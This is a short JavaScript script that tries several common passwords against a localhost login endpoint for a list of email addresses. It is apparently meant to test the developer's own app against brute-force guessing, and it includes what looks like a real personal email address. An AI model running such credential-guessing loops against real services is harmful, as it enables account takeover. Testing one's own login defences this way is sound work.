import axios from "axios"

// The endpoint you want to test
const URL = "http://localhost:4000/user/login";

// Emails and passwords to test
const emails = ["test@gmail.com", "kumar2021astro@gmail.com", "fakeuser@mail.com"];
const passwords = ["123456", "password", "qwerty", "4444", "manish123"];

async function bruteForce() {
  for (let email of emails) {
    for (let password of passwords) {
      try {
        console.log(`Trying: ${email} | ${password}`);
        const res = await axios.post(URL, { email, password });
        console.log("✅ Success:", res.data);
        return; // stop after success
      } catch (err) {
        if (err.response && err.response.status === 404) {
          console.log("❌ Invalid credentials");
        } else {
          console.log("⚠️ Error:", err.message);
        }
      }
    }
  }
}

bruteForce();
